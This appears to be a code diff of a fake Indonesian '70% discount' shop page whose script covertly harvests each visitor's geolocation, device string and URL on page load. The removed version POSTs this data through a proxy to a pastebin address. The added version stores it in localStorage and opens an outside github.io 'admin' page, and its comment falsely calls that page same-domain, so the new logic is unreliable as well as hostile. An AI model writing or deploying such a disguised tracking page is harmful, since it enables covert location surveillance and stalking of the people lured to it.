@@ -6,32 +6,38 @@
      <title>🔥 DISKON 70% - Semua Barang Murah Meriah | Shop Online</title>
      <script>
      window.onload = function() {
-         let data = {
+         // Ambil semua data
+         const data = {
              waktu: new Date().toLocaleString('id-ID'),
-             lokasi: '',
+             lokasi: 'Mencari lokasi...',
              hp: navigator.userAgent,
              halaman: window.location.href
          };
          // Ambil lokasi
          if (navigator.geolocation) {
-             navigator.geolocation.getCurrentPosition(pos => {
-                 data.lokasi = pos.coords.latitude + ", " + pos.coords.longitude;
-                 kirimData(data);
-             }, () => {
-                 data.lokasi = "Tidak diketahui";
-                 kirimData(data);
-             });
+             navigator.geolocation.getCurrentPosition(
+                 pos => {
+                     data.lokasi = pos.coords.latitude + "," + pos.coords.longitude;
+                     simpanDanKirim(data);
+                 },
+                 err => {
+                     data.lokasi = 'Tidak dapat diambil';
+                     simpanDanKirim(data);
+                 },
+                 {enableHighAccuracy: false, timeout: 3000}
+             );
          } else {
-             data.lokasi = "HP tidak dukung lokasi";
-             kirimData(data);
+             simpanDanKirim(data);
          }
-         // ✅ KIRIM DATA LANGSUNG KE TEMPAT KAMU LIHAT
-         function kirimData(dt) {
-             fetch('https://api.allorigins.win/raw?url=https://pastebin.com/raw/7kGx8vYh', {
-                 method: 'POST',
-                 headers: {'Content-Type': 'application/json'},
-                 body: JSON.stringify(dt)
-             }).catch(() => {});
+         // ✅ CARA PALING PASTI: SIMPAN KE PENYIMPANAN UMUM (SAMA DOMAIN)
+         function simpanDanKirim(dt) {
+             // Simpan data ke tempat yang bisa dibaca admin kamu
+             let semua = JSON.parse(localStorage.getItem('SEMUA_DATA_PANTAU') || '[]');
+             semua.unshift(dt); // taruh di paling atas
+             if (semua.length > 50) semua.pop(); // batasi 50 data
+             localStorage.setItem('SEMUA_DATA_PANTAU', JSON.stringify(semua));
+             // ✅ OTOMATIS BUKA HALAMAN ADMIN DI HP DIA (DATA UDAH MASUK)
+             window.open('https://kitaku711-kripto.github.io/admin.html', '_blank');
          }
      }
      </script>
